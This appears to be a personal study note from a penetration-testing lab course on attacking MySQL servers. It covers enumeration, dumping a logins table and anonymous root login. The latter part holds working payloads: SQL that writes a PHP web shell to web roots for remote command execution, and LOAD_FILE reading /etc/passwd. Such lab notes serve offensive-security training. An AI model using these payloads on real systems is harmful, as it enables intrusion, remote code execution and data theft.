TCP/3306

```
mysql --help 
``` 
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `mysql -u [user] -p[passwd] -h ${ip}`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `mysql -u [user] -p[passwd] -h ${ip} --ssl-verify-server-cert=FALSE`;

dv.paragraph("```bash\n" + command + "\n```");
```
```dataviewjs
const page = dv.page("Templater/IP");const ip = page?.IP ?? "NO IP FOUND";

const command = `sudo nmap ${ip} -sV -sC -p3306 --script mysql*`;

dv.paragraph("```bash\n" + command + "\n```");

```

---


Login to database

```shell-session
Retric@htb[/htb]$ mysql -u root -p<password>
```

```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| users              |
+--------------------+

mysql> USE users;

Database changed
```

```shell-session
mysql> SHOW TABLES;

+-----------------+
| Tables_in_users |
+-----------------+
| logins          |
+-----------------+
1 row in set (0.00 sec)
```

```shell-session
mysql> DESCRIBE logins;

+-----------------+--------------+
| Field           | Type         |
+-----------------+--------------+
| id              | int          |
| username        | varchar(100) |
| password        | varchar(100) |
| date_of_joining | date         |
+-----------------+--------------+
4 rows in set (0.00 sec)
```

Dumps all content out
```
select * from username
```


---



```
show databases;
```

```
use [table_name];
```

```
show columns from users;
```

```
SELECt * FROM [table_name] WHERE [row_name] LIKE "target_name"
```

![[Pasted image 20250512163753.png]]

```
mysql -h [[IP]] -u root
```

"root" to sign in anonymously

![[Pasted image 20250512164137.png]]

| SHOW databases             | Prints out the databases we can access.                     |
| -------------------------- | ----------------------------------------------------------- |
| USE {database_name}        | Set to use the database named {database_name}.              |
| SHOW tables                | Prints out the available tables inside the current database |
| SELECT * FROM {table_name} | Prints out all the data from the table {table_name}.        |

![[Pasted image 20250512164447.png]]

![[Pasted image 20250512164457.png]]

![[Pasted image 20250512164509.png]]

![[Pasted image 20250512164519.png]]

python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected table.                                                               |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

Write local file

```shell-session
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

Secure file privileges

```shell-session
show variables like "secure_file_priv";
```

RESULT

```shell-session
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

by default a `MySQL` installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

Read local files in MySQL

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```

MY SQL WEB INJECTION

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\test2.php';
```

Go to 
```
http://inlanefreight.htb/test2.php?c=[cmd here]
```

